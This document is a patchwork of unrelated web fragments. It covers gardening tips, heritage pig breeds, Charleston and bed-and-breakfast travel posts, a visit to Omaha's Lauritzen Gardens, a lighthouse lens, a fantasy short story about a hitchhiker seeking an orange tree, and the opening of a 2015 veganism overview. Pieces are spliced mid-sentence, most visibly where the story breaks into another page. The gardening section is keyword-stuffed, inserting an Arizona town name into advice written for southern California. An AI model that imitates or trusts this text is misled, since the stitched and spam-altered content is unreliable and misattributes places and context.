the soil condition, the next step would be to decide on a suitable spot in your garden in Rillito <b>AZ</b> 85654. The spot you choose for planting the vegetables should be such that it should not cause disturbance or inconvenience to you or other family members.</p>   <p>Secondly, the spot should receive a good amount of sunshine and adequate wind. The garden should ideally receive 6-8 hours of sunlight every day in Rillito <b>AZ</b> 85654. Sunlight provides energy to plants to convert carbon dioxide into sugar which they use for food. If the plants do not receive sufficient sunlight, they may not give fruits even if the plants look green and healthy. Carrots, tomatoes, radishes and beets need at least 6-8 hours of direct light every day. Plants such as lettuce, which are grown just for their leaves, can grow nicely in the shade and don&#x2019;t need direct light from the sun. In fact they may need some protection if the sun is too bright and shiny.</p>   <p>4. When you start a garden and try to maintain it, you may encounter various difficulties from time to time. You have to acquire knowledge of how to maintain your garden and what steps are needed to prevent the plants from damage. If you know someone who has experience in gardening, you can take the help of that person. If not, you have to do the research yourself. Google can be your best friend when you are looking for a solution to a specific problem.</p>   <p>You can also get hold of a few good books on gardening in Rillito <b>AZ</b> 85654. You can browse through hundreds of such books on Amazon. You can even read blogs on this topic where gardening experts share their tips and techniques. YouTube is another wonderful source for people who are visual learners who prefer watching instead of reading.</p>      <p>While spring officially begins March 20, the just completed warm (sometimes hot) February means gardeners in southern California need to get an early start to the growing season.</p>   <p><strong>Add Plants That Attract Good Bugs: </strong>Attract good bugs (ladybugs, lacewings, hoverflies) to your yard by adding plants they love. Plants that appeal to good bugs are yarrow, dill, fennel, marigolds, coriander and buckwheat. The good bugs will eat the bad bugs (such as aphids, ants and whiteflies) that can cause havoc in your garden.</p>   <p><strong>Give Plants And Trees A Nitrogen Boost: </strong>Now is the time to give your garden a shot in the arm with nitrogen fertilizer. Plants usually need to be fertilized only once in March at the beginning of the spring growing period and again in September in Rillito <b>AZ</b> 85654.</p>   <p><strong>Don&#x2019;t Give Weeds A Fighting Chance: </strong>Because February was unusually warm, the minimal rain that fell prompted weeds to sprout in southern California. Weeds can easily become out of control and much harder to remove as they take root. A natural way to protect gardens from weeds is by using mulch. This top dressing will crowd out weeds before they gain a foothold. Weed first before applying. Mulch at least two to three inches deep around trees, shrubs, flowers and plants. Make sure the mulch does not touch the tree trunks.</p>   <p><strong>Plant Vegetables and Herbs from Seed: </strong>After the last chance for frost (around mid-month) and the soil warms, cultivate your vegetable garden soil down about one foot. Mix in organic soil planting amendments. Plant warm-season vegetable seeds including tomatoes, peppers, green beans, cucumbers, squash, eggplant, onion, potatoes, spinach, turnips and corn. It&#x2019;s also the time to plant herbs from seed such as basil, mint, oregano, parsley and rosemary. You can even still plant cool-season vegetables including broccoli, lettuce, cabbage and kale. Vegetables that can be planted year round are carrots, beets and radishes.</p>   <p><strong>Keep Plants Looking Full By Dividing Perennials: </strong>After a few years, perennials tend to form in clumps. These clumps become scraggly and big bare spots form within the plants. To avoid this, divide perennials and place the new plantings in other areas of the yard. When dividing a perennial, make sure you dig deep under a clump so you lift the root system out intact. Remove any portion of the clump that looks dead or diseased. Large clumps can be divided further. Place the divided clumps in holes that fit the root base. Mix in soil amendment and water. This is a cost-efficient way to add to your flower garden.</p>   <p><strong>Keep Your Garden Manageable: </strong>It may be tempting to create a sprawling garden filled with all kinds of vegetables.

These were naturally thrifty, hardy animals raised for their meat, bacon and lard. The food chain worked beautifully for all concerned, the pigs lived off the land, on grass, grains and windfalls, and occasionally whey from the churn.          </div>         </div>        </div>       </div>      </div>       <div>       <h5>Learn More</h5>       <div>        <div>         Unfortunately, heritage pork breeds are not suited for the intensive farming techniques being used nowadays, and some of the older breeds are in danger of being lost forever. Fortunately some are being preserved by a few dedicated farmers concerned about the general indifference of the consumer towards heritage breed conservation.        </div>        <div>         All heritage pork in America comes from pure and cross-bred livestock:        </div>        <div>         <strong>The Berkshire:</strong> a first class black pig with excellent lean meat. Occasionally, when commercial white pork becomes too bland and tasteless, some Berkshire genes are used to improve it.        </div>        <div>         <strong>The Tamworth:</strong> a red heritage breed producing the best bacon in the U.S., a direct descendant of the wild boars which roamed the forests of Staffordshire. This breed was introduced to North America around the 1870&#x2019;s.        </div>        <div>         <strong>The Red Wattle:</strong> This one&#x2019;s really in danger of extinction, it has dark, lean tender meat. It originally came to New Orleans via New Caledonia and developed in Texas. He went out of fashion when people wanted pigs for lard.        </div>        <div>         <strong>The Duroc:</strong> Its genes appear in many modern breeds. This is one of the juiciest and tastiest breed of pig.        </div>        <div>         <strong>The Gloucester Old Spot:</strong> a.k.a. The Iron Age Pig, this breed is a cross between the domestic and wild pig. Excellent meat, at one point there were great numbers in the U.S.        </div>        <div>         <strong>The Yorkshire:</strong> They originated in Yorkshire England, home of the famed All Creatures Great and Small stories. Yorkshires do very well on pasture and are excellent mothers weaning large numbers of piglets. They are a foundation breed crossed with other breeds to create modern commercial pig gene tics.        </div>        <div>         <strong>The Large Black:</strong> A pasturing pig, small shoulders but very tasty lean hams. There are fewer than 200 in the U.S. The idea is preserving heritage breeds by consuming them. It is dangerous to have only a handful of commercial livestock breeds which have all the same traits. A new illness, or a radical change in the world&#x2019;s climate, could wipe them out in no time without enough variation in the genetic pool available for them to recover. Modern industrial breeds are weak in the sense that they now have genetic defects due to excessive, unnatural inbreeding.        </div>       </div>       </div>      </div>      <div>      <div>       <div>        <h4>News on the Farm</h4>        <ul>         <li> <span>March 20, 2016</span> </li>         <li> <span>March 2, 2016</span> </li>         <li> <span>June 22, 2015</span> </li>         <li> <span>May 4, 2015</span> </li>         <li> <span>June 25, 2014</span> </li>        </ul>       </div>        <div>        <h4>Living Green</h4>        <div>         At White Gates Farm, we believe in reducing our carbon footprint.

   <article>   <header>    <h1>Charleston</h1>   </header>   <section>    <p>During my first year of fulltiming in 2001, I spent several months in Charleston working for more gas money. I was entranced by this beautiful southern belle city and spent my on the road here. I kept a , but somehow I wound up losing almost all of the pictures I had taken. So I&#x2019;m glad I got the chance to stop here again on my way to Savannah and relive some of those happy times.</p>    <p>Gawking at these homes along the was one of those times I just pinched myself to make sure I really was the lucky woman who was getting to see these things.</p>    <p>You can just picture the southern belles drinking sweet tea on these long wrap-around porches.</p>    <p>This was my favorite &#x2013; . Now a prestigious B&amp;B, it was a wedding gift from a generous father to his beloved daughter. It&#x2019;s hard to believe a check for $75,000 would build this jewel even back in 1890!</p>    <p>Cobblestone streets and cute little courtyards abound and made me wonder about what was behind the artistic wrought <b>iron</b> <b>gates</b>.</p>    <p> &#x2013; The contrast between the colorful new life that spring brings amidst drab gravestones representing death was thought provoking to say the least.</p>    <p> &#x2013; In the mid 1700&#x2019;s this was the center of commerce in Charleston. Merchants had stores on the first floor and lived on the floors above. Neglected over time, they are now lovingly restored and a mainstay of historic Charleston images.</p>    <p>Being a tree lover and hugger from childhood, nearby was one of my favorite stops. </p>    <h4>A few Charleston Links:</h4>   </section>   </article>

Restaurants, shops, tours, transportation are all available right outside the lobby door, so why in the world would you choose to stay in a Bed and Breakfast?</p>   <p>Believe me; you want to stay in a Bed and Breakfast because they can also offer those very same amenities, along with a truly amazing and historical place to stay, not to mention that you will also have a fabulous breakfast included in your rate. I have stayed in Bed and Breakfast locations all over the United States and find that I often enjoy them much more than a conventional hotel stay. Here is an array of vastly different locations I have visited that you might want to add to your travel bucket list if you plan to visit any of these destinations.</p>   <p><em>The Villa D&#x2019;Citta in Chicago, Illinois</em></p>   <p>A lovely, historic Greystone mansion located in the prestigious Chicago neighborhood of Lincoln Park, which has been remodeled and furnished like an elegant Italian villa, this Bed and Breakfast is truly one of the most luxurious places my husband and I have ever stayed. With a beautiful, outside grotto and large hot tub, they have plenty of room for relaxing and even host cookouts in the summer. The back door leads inside to a nicely furnished and very comfortable lounge area with a fireplace which adjoins the dining area and the huge, state of the art kitchen.</p>   <div>    <p>Sign for the Villa D&#x2019;Citta in Chicago, Illinois.</p>   </div>   <p>The beautifully decorated living room is furnished with comfortable furniture for guests to gather and get to know one another. The Grand Tuscan Suite, where we stayed, is over 1,000 square feet and offers a flat screen television, fireplace, French doors out to a tiny but perfect terrace, and lovely hardwood floors. In addition, there is a huge bathroom with twin sinks, a marble soaking tub and a full steam shower. There is also another small bedroom with two twin beds which would be perfect for kids or another couple.&#xa0; Of course a full, hot, and delicious breakfast is served every morning and fresh fruit and freshly baked cookies are available every day, but the kitchen is also kept stocked for guests and you are free to help yourself. The fridge is full of cold tea and lemonade, as well as the makings for Paninis, pizzas, and waffles. A Panini maker, pizza oven, and waffle maker&#xa0;are just part of the incredible&#xa0;service here. You are also free to use the kitchen to prepare meals or to store takeout in the fridge.&#xa0;It&#x2019;s the perfect place to stay when visiting Chicago.</p>   <div>    <p>Quiche at Villa D&#x2019;Citta.</p>   </div>   <p><em>The Inns at El Rancho Merlita, Tucson, Arizona</em></p>   <p>Have you ever heard for Merle Norman, the cosmetics queen? Did you know she had a winter hideaway in Arizona? She certainly did and that hideaway has turned into an amazing Bed and Breakfast tucked away in a neighborhood on the outskirts of Tucson. Head up the driveway that wends through the desert landscape, through the lovely <b>gates</b> and peace and quiet envelops you. Pretty soon, you find that the history of this gem of a bed and breakfast location&#xa0;is just as fascinating as the peacefulness. In the 1950&#x2032;s when Tucson was a quiet, small town in the middle of the desert, Merle Norman bought a big tract of land off an old cattle trail.</p>   <p>She then commissioned her brother to design a wonderful 1950&#x2032;s ranch house that would be&#xa0;low and sprawling so it would stay cool in the desert heat and would have brick walls and a red tile roof, huge picture windows displaying the gorgeous views of both the desert and the mountains that surround Tucson. A long verandah would stretch across the front of&#xa0;the house and overlook a huge lawn and a beautiful swimming pool. He designed it exactly like that and that is&#xa0;just what you see when you pull in through the ornate, <b>iron</b>&#xa0;<b>gates</b>.&#xa0;There are actually two inns on the property; the Ranch House Inn and the Arroyo House Inn.</p>   <div>    <p>View of the backyard at The Inns at El Rancho Merlita in Tucson, Arizona.</p>   </div>   <p>The Arroyo House Inn is the estate&#x2019;s original guest house and has four rooms and suites, each with unique decor and luxury accommodations and amenities. All the rooms include luxurious linens, robes &amp; slippers, lovely bath products, wife and direct access to the outside patios. My husband and I stayed in the Ranch House Inn in the Spanish Colonial room and the gorgeous furnishings in this room were obviously influenced by Spain&#x2019;s colonial influence on Arizona. The huge bathroom and equally huge tub and a large&#xa0;walk-in closet were very nice additions to our room. The back yard&#xa0;of the&#xa0;inn is completely different from the front with its green grass lawn and has been maintained in a natural desert state. The inside of the Ranch House Inn is just as lovely as the rest of the property. It truly seems like a home and you are welcome to relax in the comfortable living room, with its Western theme. There is also a study with more very comfortable furniture and a TV, although there are also TV&#x2019;s in every bedroom. The breakfast at the Inns at El Rancho Merlita was wonderful &#x2013; and we also enjoyed the freshly baked cookies in the dining area every afternoon. It&#x2019;s the perfect place to stay when visiting Tucson.</p>   <div>    <p>Baked apple for breakfast at the Inns at El Rancho Merlita.</p>   </div>   <p><em>The Red Coach Inn, Niagara Falls, New York</em></p>   <p>One of the best things about this charming, historic (they opened for business in 1923!) Bed and Breakfast Inn, aside from the amazing suites, the incredible breakfasts, and the lovely neighborhood, is the fact that it is located just a few feet from the Upper Rapids which lead to Niagara Falls. The Inn was built in the architectural style of the old English Tudor period, was named for General Lafayette&#x2019;s famous red carriage, and is actually considered a Bed and Breakfast Hotel, which is why they include the wonderful breakfasts.</p>   <div>    <p>The Red Coach Inn in Niagara Falls, New York.</p>   </div>   <p>We enjoyed everything from hot oatmeal to freshly baked waffles each morning ordered off the menu and included in our rate. &#xa0;Our quite fabulous Sheffield Suite was actually located out the front door of the beautifully furnished lobby and down a brick sidewalk in another part of the Inn. An impressive foyer with burgundy carpet was, surprisingly, part of our suite with doors leading to a bedroom and our bathroom which had a fabulous Jacuzzi tub. The bedroom had gorgeous, antique furniture including a comfy king-size bed and a nice desk, a cozy gas fireplace and a little kitchen area with a fridge, microwave, coffeemaker and toaster. You could easily make your own breakfast here but why would you when a full breakfast is included in your rate? There was a telephone with voicemail and free long distance anywhere in the United States, a Bose stereo, a television, free wireless Internet, plush terrycloth robes, hair dryer, and Gilchrist and Soames amenities from England. The restaurant is a very nice place to relax and enjoy a meal, with a beautiful natural stone fireplace for winter and a patio for summer. &#xa0;It&#x2019;s the perfect place to stay when you visit Niagara Falls.</p>   <p><em>Pelican Cove Inn Bed and Breakfast, Carlsbad, California</em></p>   <p>Located just two blocks from the beach and three blocks from the lovely downtown area of Carlsbad, this beautiful, large beach house has been converted into a very comfortable Inn with 10 differently configured rooms. All the rooms have a private bath and private entrance, along with a feather bed and fireplace. &#xa0;Our suite was huge with a nice bedroom, sitting area, a big walk-in closet and bathroom. My husband and I were in the Santa Barbara room but each room is equally   <div>   <p>The Union Pacific train rolls through a tunnel cut out of a tree trunk, past Omaha Central High School and several other historic Omaha buildings. You become mesmerized as you watch it exit the covered bridge that spans a flowing river. Then you spot another train cross an overhead steel bridge and travel back into the woods. There is something fascinating about model railroad layouts, especially miniature versions of real existing structures and trains. Add natural landscaping, the landscaping of the beautiful Lauritzen Gardens, and the Model Railroad Garden, a miniature Omaha, becomes a work of art.</p>   <p>The other areas of Lauritzen Gardens are beautiful, too. When you enter, you&#x2019;ll first pass through the atrium where caf&#xe9; tables are set up amidst tropical plants.</p>   <p>For the holidays the tables are replaced with poinsettia plants stacked into the shape of a giant Christmas tree and the atrium twinkles with little lights.</p>   <p><span>Don&#x2019;t miss a Midwest Wanderer post.&#xa0; For a FREE subscription, enter your e-mail address in the Subscribe2 box to the left and click Subscribe.</span></p>   <p>A brand new, much larger atrium is under construction and set to open in Fall 2014, promising more year-round botanical beauty.</p>   <p>Outside, a walk down the paths from garden to garden, admiring bright flowers and flitting monarch butterflies, was an enjoyable way to spend a beautiful summer morning with fellow travel writer Lisa Trudell of the Omaha-based .</p>   <p>With Lisa&#x2019;s familiarity with Lauritzen Gardens, she was able to point out all the don&#x2019;t-miss spots, like the Hitchcock-Kountze Victorian Garden, especially elegant with its bright flowers set against a red-brick fence with black wrought <b>iron</b> <b>gates</b> &#x2026;</p>   <p>&#x2026; and the Japanese Sunpu Garden Gate, a gift from sister city Shizuoka. The gate is the start of what will be a six-acre Japanese garden.</p>   <p>She also pointed out the art work &#x2026;</p>   <p>&#x2026; and the cascading Woodland Waterfall.</p>   <p>The highlight for me, however, was the Model Railroad Garden, where I snapped photo after photo and then stood and watched the trains go around and around the layout until Lisa reminded me we were running short on time.</p>   <p>Railroad fans will want to stop at Kenefick Park, across the parking lot from Lauritzen Gardens, where two great Union Pacific Railroad locomotives are parked. You will have noticed the locomotives from I-80 if you came into Omaha from the west. The Centennial No. 6900 is the largest and most powerful diesel-electric locomotive ever built. Big Boy No. 4023 is the world&#x2019;s largest steam locomotive.</p>   <p>, located just north of I-80 and south of Omaha&#x2019;s Old Market district, is open year-round. Check the web site for hours and admission rates.</p>   <p><em>Disclosure: My visit to Lauritzen Gardens was hosted by the &#xa0;and the Lauritzen Gardens, but any opinions expressed in this post are my own.</em></p>   <p>Thank you for reading Midwest Wanderer.

Its five-wick lard oil lamp, and first-order Fresnel lens, comprised of 1,008 prisms, was first lit at sunset, November 15, 1872. The lens stands 16 feet tall, 6 feet in diameter, and weighs 2,000 pounds. Now on display in the Fog Signal building, it sat in a lantern room constructed at the Lighthouse Service&#x2019;s general depot in New York before being shipped around the Horn.

A few miles back.&#x201d; He waved his free hand toward the northwest. &#x201c;Thanks for stopping, lady.&#x201d;</p>   <p>When kids his age said &#x2018;lady&#x2019; it meant &#x2018;forty-something fat bitch&#x2019;. His &#x2018;lady&#x2019; was different enough that I said, &#x201c;Join me and Gray Mare, then.&#x201d;</p>   <p>He bent to look through the window. &#x201c;You have a horse?&#x201d;</p>   <p>&#x201c;The Saab.&#x201d; I patted the dashboard. &#x201c;From a Tolkien story, with an old gray mare of uncommon good sense.&#x201d;</p>   <p>&#x201c;Ah,&#x201d; he said. &#x201c;Sympathetic magic.&#x201d;</p>   <p>I reminded him about the seatbelt. He fumbled with the catch, and jumped at the Mare&#x2019;s stuttering engine. I smiled. He turned to look out the window.</p>   <p>Jackrabbits and mourning doves watched us pass. A hawk soared high enough to be gilt by dawn-light. The boy frowned at the hawk.</p>   <p>When the road let me, I glanced at him. Eighteen, I thought, maybe nineteen. Thin, tall, colt-knobby at the joints. Bronze-red hair curled against high cheekbones and olive skin. Jeans dark and crisp, a clean gray T-shirt, a storm-blue jacket with the sheen of silk. He didn&#x2019;t smell of three days in the desert, or even an hour. I didn&#x2019;t think the jacket hid a gun.</p>   <p>On the floor, the gasoline can rocked. Red-orange dust stained the boy&#x2019;s jeans. I saw the other side of the can, its metal a pitted lacework of rust.</p>   <p>The Mare jittered over the center line.</p>   <p>He looked at me, then at the can. &#x201c;Ah. I needed a lure. I don&#x2019;t mean to hurt you.&#x201d;</p>   <p>My knuckles whitened on the steering wheel. I kept my voice light. &#x201c;You&#x2019;ve been here three days. What do you want?&#x201d;</p>   <p>&#x201c;Help me. Before sunrise. Please.&#x201d;</p>   <p>A juvenile detention center, heralded by <em>Do Not Stop For Hitchhikers</em> signs, lay not too many miles eastward. More sunlit hawks wheeled over a salt flat ahead. &#x201c;What happens at sunrise?&#x201d;</p>   <p>&#x201c;To you? Nothing. Will you take me into the city?&#x201d;</p>   <p>I glanced east. The first sliver of sunlight pierced a gap in the mountains. Half a mile before us, mirages rippled golden above asphalt.</p>   <p>&#x201c;Please?&#x201d; he whispered again, staring ahead, his fingers clenching the seatbelt.</p>   <p>&#x201c;All right.&#x201d; Why not? &#x201c;To the city.&#x201d;</p>   <p>Peach-golden light spilled across the desert and into my car. The boy cast a watery shadow against torn upholstery. He forced one hand against his lips. A hawk dipped by my side window, pacing the car, its wingtip almost brushing the glass. Over the Mare&#x2019;s engine, I heard the hawk&#x2019;s scream recede into distance.</p>   <p>Sunlight. The hawk was gone. When I glanced over, the boy&#x2019;s shadow was solid as mine. His smile was unsteady, his gray eyes bright. &#x201c;Thank you,&#x201d; he said.</p>   <p>&#x201c;You&#x2019;re welcome. Just send some luck my way.&#x201d;</p>   <p>&#x201c;On my honor, I will.&#x201d;</p>   <p>Such words. Prep school? Royalty?</p>   <p>&#x201c;So,&#x201d; I said, &#x201c;Your motorcycle ran out of gas three mornings in a row.&#x201d;</p>   <p>&#x201c;And somebody stole my real gas can today, about ten miles before that town &#x2013;&#x201d;</p>   <p>&#x201c;Wickenburg. Better make it twenty miles. I live ten miles north of it.&#x201d;</p>   <p>&#x201c;Twenty, then.&#x201d;</p>   <p>&#x201c;Why are you afraid of dawn? Why are you here?&#x201d;</p>   <p>&#x201c;Oranges.&#x201d;</p>   <p>&#x201c;Oranges?&#x201d;</p>   <p>&#x201c;My father owns an experimental nursery in, er, Nevada. Hybridizing plants to arid regions. Grafting delicate strains to strong stock. He sent me down to look at an odd old variety he wants, growing at a private ranch. I&#x2019;ll try to buy some cuttings. Our orchards are dying out. This hybrid might save them.&#x201d;</p>   <p>The mile markers surged by. I began to wonder about our game. &#x201c;I know legends about oranges.&#x201d;</p>   <p>He humored me. &#x201c;Really?&#x201d;</p>   <p>&#x201c;The golden apples of the Hesperides. One of Hercules&#x2019; tasks, I think. A 17th Century Dutchman said they were oranges. Maybe the Hebrew&#x2019;s Tree of Knowledge was an orange tree. Or was it apricot? And I read a fantasy book once, long ago, that said every thirteenth fruit of the orange tree held a wish. They were only folktales, but beautiful.&#x201d;</p>   <p>&#x201c;You&#x2019;re a scholar?&#x201d;</p>   <p>&#x201c;Hardly. My family lived in a good part of Phoenix. The houses seemed to come with their own transplanted English gardens. Whoever designed ours was a citrus addict. He&#x2019;d left his books in the attic.&#x201d;</p>   <p>His regal voice sharpened. &#x201c;Do you own them still?&#x201d;</p>   <p>&#x201c;My mother sold them in an estate sale years ago. To help me pay for art school. For all the good it did us, we should have kept the books and the house.&#x201d;</p>   <p>&#x201c;I smelled orchards blooming before dawn. I thought the city was magical at night, from up in the mountains,&#x201d; the boy said. &#x201c;A lake of stars.&#x201d;</p>   <p>&#x201c;Most of the orchards are pastel subdivisions by now. It&#x2019;s only February. Right now, you smell the old orange trees in yards and along the freeways. The green doesn&#x2019;t really belong here. Like the swimming pools and golf courses. Phoenix is as much a mirage as Vegas.&#x201d;</p>   <p>&#x201c;Vegas?&#x201d;</p>   <p>&#x201c;Never mind.&#x201d; I wondered where he really lived.</p>   <p>&#x201c;I wish you could see it through my eyes, lady.&#x201d;</p>   <p>&#x201c;I can&#x2019;t see around the past.&#x201d;</p>   <p>&#x201c;What past?&#x201d; His hand flattened on my forehead.</p>   <p>&#x201c;Oh,&#x201d; I said.</p>   <p>The Arizona Tourism Board must marshal legions of photographers on mornings like this, I thought. Twenty miles away, skyscrapers rose like crystal blocks. Surreal mountains ringed the city, speared up through it in seven-hundred-foot-high scarps of russet and amber sandstone. Golf courses and swimming pools were beryls and sapphires set in a misty golden valley. The abomination was beautiful because it had no right to exist, an ephemeral kingdom made as much of illusion as water and steel.</p>   <p>&#x201c;Treasure it. It cannot last,&#x201d; he whispered. His fingertips left my skin, but some of the sudden magic stayed. &#x201c;I know deserts. This one waits below the surface. The desert says people lived here long ago, and it did the same to them. Who were they?&#x201d;</p>   <p>&#x201c;Hohokam,&#x201d; I dredged up high-school memories. &#x201c;Native Americans. Canal-builders. Some of the new canals follow the old channels. The first people are long gone. Maybe some of the nearby tribes are descendants. I don&#x2019;t know.&#x201d;</p>   <p>The boy nodded. &#x201c;Whoever rebuilt those canals made the same bargain as before, probably unwitting. The desert&#x2019;s magic, in exchange for desolation later. Whatever lives and grows here has the power to defy time and entropy, at least for a while.&#x201d;</p>   <p>&#x201c;This is just Phoenix.&#x201d;</p>   <p>&#x201c;This is Phoenix, lady. A city twice-risen from sand, called after the Benu, the Firebird? There is great power in names. Anything can happen here, while the city stands and water flows through it.&#x201d;</p>   <p>&#x201c;You&#x2019;re nuts.&#x201d;</p>   <p>&#x201c;You&#x2019;re blind.&#x201d;</p>   <p>&#x201c;Perhaps, but I&#x2019;m the driver.&#x201d;</p>   <p>&#x201c;Then watch where you&#x2019;re going.&#x201d;</p>   <p>The surviving citrus orchards yielded to pink-walled, fake-adobe subdivisions and seedy strip malls. The painterly part of my brain stopped its habitual self-doubt long enough to piece together a sketch. Under a hot white noon sky, three orange-tree dryads danced in a desert full of shattered glass and metal. Their bodies were lush, heavy, relics of a beauty centuries out of style. I had never thought of myself as beautiful &#x2013; but the dryads were. I tried to analyze the imagery. A manifesto railing against over-development? A 20th century take on Classicism? A size-wise fairy tale?</p>   <p>The vision refused explanation.</p>   <p>&#x201c;Where are we going?&#x201d; asked my passenger, pulling me out of the reverie in time to realize I&#x2019;d been pacing traffic at an effortless seventy miles per hour, instead of my normal plodding fifty-five.</p>   <p>&#x201c;I work downtown. Where do you need to be?&#x201d;</p>   <p>&#x201c;Are you an artist there?&#x201d;</p>   <p>&#x201c;I wish. I don&#x2019;t even know what art is, anymore. Did you know, there&#x2019;s a guy in London who makes art from dead sharks and cows in formaldehyde tanks?&#x201d;</p>   <p>He made a disgusted noise. &#x201c;We have people like that. Are they valued here?&#x201d;</p>   <p>&#x201c;Enough to be famous for a while. The recession hit even him in the end, I guess. My day-job is desk jockey for an information security company. I keep telling myself I&#x2019;m only waiting for the big break. Let&#x2019;s worry about your future, first. The bus connections aren&#x2019;t the best. But they&#x2019;ll get you close to your orange tree. Do you know the address?&#x201d;</p>   <p>&#x201c;Bus?&#x201d; he asked.</p>   <p>I was late to work, giving him cash to buy an all-day transit pass and a map. I blamed traffic, and planned another painting during my breaks: in brown-purple dusk, a scene of tropical fish swimming between wire fences and cacti. I imagined city lights blooming down in a valley, like lost Atlantis in an undersea rift.</p>   <p>Like the dryads it refused agenda, craving only existence.</p>   <p>I pushed my last sketch aside and concentrated on work. Downtown Phoenix intruded through the window. By late afternoon, an unfamiliar city rebuilt itself outside the office window: all angles, color-washed planes, clean lines that echoed back to a 1920&#x2019;s ideal of glorified technology and a bright future.</p>   <p>So many ideas. Could I paint even one of them? Trying would cost me nothing but the old watercolor paints slowly drying in their tubes. Blank paper waited in my tiny studio, a dozen white-shuttered windows that didn&#x2019;t need reasons or markets or clients to exist.</p>   <p>I walked outside to the Mare.</p>   <p>Go home right now, sang the sun and the wind in the green palm-fronds, and you can paint whatever you want as long as you live.</p>   <p>I saw the boy leaning against my car, his head bent over his hands. The lines of his body, outlined by red-orange sunlight, almost made me reach for the little sketchbook in my purse.</p>   <p>&#x201c;Any luck?&#x201d;</p>   <p>He looked up, face set in a scowl. &#x201c;No. I need your help again.&#x201d;</p>   <p>The muse&#x2019;s moment began to ebb. I might still paint. If I got in the Mare without involving myself again. The orange-tree dryads, the desert reef, and the crystal towers begged me to drive away.</p>   <p>&#x201c;The owner wasn&#x2019;t cooperative,&#x201d; he snarled. He tossed away the object in his hands, a dead brown twig shedding desiccated leaves. &#x201c;He wanted things I didn&#x2019;t have. Credit cards, check guarantee cards, my father&#x2019;s tax number, references. And he wouldn&#x2019;t take what I had for payment! All for a wretched, half-dead tree that no one will be able to save in a year!&#x201d;</p>   <p>My moment of perfect creativity fled. &#x201c;What did you try to give him? Not the gasoline can, I hope.&#x201d;</p>   <p>He upended a fist-sized green suede bag on the Mare&#x2019;s hood. I winced at the noise, then forgot to breathe. Finger-long bars of gold, chased with wavy interlocking designs, clanged against old steel. Polished nuggets caught the sun, flaring Gulf-stream blue, dark carmine, jungle-green. A perfect spectrum sprayed across pitted paint, from a water-clear stone the diameter of my thumb.</p>   <p>The boy glared at the trove. &#x201c;He said I was probably a thief. Then he threw me out. Threatened to call the police. So I found you again.&#x201d;</p>   <p>I leaned back against my car. &#x201c;How on earth?&#x201d; Did I really want to know how he found me, in all of central Phoenix? &#x201c;What now?&#x201d;</p>   <p>&#x201c;You helped me once.&#x201d; He scooped up a handful of gems and gold. &#x201c;You&#x2019;re poor, but you know this city. You can turn this dross into useful coin. It&#x2019;s yours.&#x201d;</p>   <p>&#x201c;If I can get you back to that ranch tonight.&#x201d;</p>   <p>&#x201c;Yes.&#x201d;</p>   <p>If I couldn&#x2019;t paint, I thought, I might as well try being rich and talentless.</p>   <p>#</p>   <p>We idled along quiet drives curtained in the deep greens made possible by water and money. I saw too many short-sale signs in front of the sprawling houses on this rich street. &#x201c;We may be just in time,&#x201d; I said. &#x201c;Your farmer might sell to a real-estate investor, if he&#x2019;s not losing his property to a bank.&#x201d;</p>   <p>&#x201c;Would the new owners keep the orchard?&#x201d;</p>   <p>&#x201c;Maybe some of the younger, prettier trees.&#x201d;</p>   <p>We drove past the orchard and its high <b>iron</b> <b>gates</b>. While my passenger chewed his fingernails, I parked half a block away. &#x201c;No for-sale sign,&#x201d; I said. &#x201c;He&#x2019;s fighting the tide and staying. That means he&#x2019;ll have security.&#x201d;</p>   <p>&#x201c;I&#x2019;ll get you out of it.&#x201d;</p>   <p>&#x201c;I suppose you&#x2019;ll flash gold in front of the guards?&#x201d;</p>   <p>&#x201c;No guards. Just sizzling wires and tiny lights.&#x201d;</p>   <p>&#x201c;Electronics, then,&#x201d; I sighed.</p>   <p>&#x201c;I didn&#x2019;t come this far to let a fence stop me.&#x201d;</p>   <p>And I hadn&#x2019;t come this far to stay with the Mare.</p>   <p>The boy ghosted to the main gate. I expected him to have tools. Then again, remembering the golden bars, I wasn&#x2019;t startled when he simply raised a hand to the <b>iron</b>. Something crackled. I smelled acrid smoke. The gate swung open. All the nearby crickets stopped chirping.</p>   <p>&#x201c;Come on,&#x201d; he whispered. &#x201c;I&#x2019;ll need your help inside.&#x201d;</p>   <p>I followed him, my sensible heels cns on Nov. 11th according to their </p>   <p>&#xa0;</p>   <div>    <div>     <h3>Share the Urban Escape Vehicle adventure:</h3>    </div>   </div>  </div>  
   <div>   <h1>The State of Veganism, 2015</h1>   <p>Here are some&#xa0;up-to-date observations on the current status of the vegan philosophy&#xa0;from various important viewpoints.</p>   <h2>Vegan diets can be healthy or unhealthy</h2>   <p>A vegan diet, like an omnivorous diet, can be unhealthy if little thought is given to its planning. Since the beginnings of veganism in the early 1800s until only recently, vegan diets has received criticism from most nutritional authorities for lacking various nutrients, or proportions of nutrients including protein, calcium, iron, zinc, vitamin B12 and omega-3 fatty acids. In the past several decades&#xa0;many of these claims have been shown false and it has been demonstrated that a strict vegan diet can comfortably fulfill all necessary nutritional requirements of a healthy human. It is now the opinion of every major national and international nutritional association that a well planned vegan diet can be as healthy, or, as many have stated, healthier in some aspects, than omnivorous and ovo-lacto vegetarian diets.</p>   <ol>    <li><strong>American Dietetic Association: </strong>&#x201c;It is the position of the American Dietetic Association that appropriately planned vegetarian diets, including total vegetarian or vegan diets, are healthful, nutritionally adequate, and may provide health benefits in the prevention and treatment of certain diseases. Well-planned vegetarian diets are appropriate for individuals during all stages of the life cycle, including pregnancy, lactation, infancy, childhood, and adolescence, and for athletes.&#x201d; [1]</li>    <li><strong>Dietitian&#x2019;s Association of Australia:</strong> &#x201c;Despite these restrictions [a lack of animal products], with good planning it is still possible to obtain all the nutrients required for good health on a vegan diet.&#x201d; [2]</li>    <li><strong>British Dietitians Association:</strong>&#xa0;&#x201c;Well planned vegetarian [and strict-vegetarian] diets can be nutritious and&#xa0;healthy. They are associated with lower risks of&#xa0;heart disease, high blood pressure, Type 2 diabetes,&#xa0;obesity, certain cancers and lower cholesterol levels.&#xa0;This could be because such diets are lower in&#xa0;saturated fat, contain fewer calories and more fibre&#xa0;and phytonutrients/phytochemicals (these can have&#xa0;protective properties) than non-vegetarian diets.&#x201d; [3]</li>    <li><strong>Dietitians of Canada:</strong>&#xa0;&#x201c;A healthy vegan diet has many health benefits including lower rates of obesity, heart disease, high blood pressure, high blood cholesterol, type 2 diabetes and certain types of cancer.&#x201d; and &#x201c;A healthy vegan diet can meet all your nutrient needs at any stage of life including when you are pregnant, breastfeeding or for older adults. [4]</li>   </ol>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>Athletes&#xa0;can excel&#xa0;on a vegan 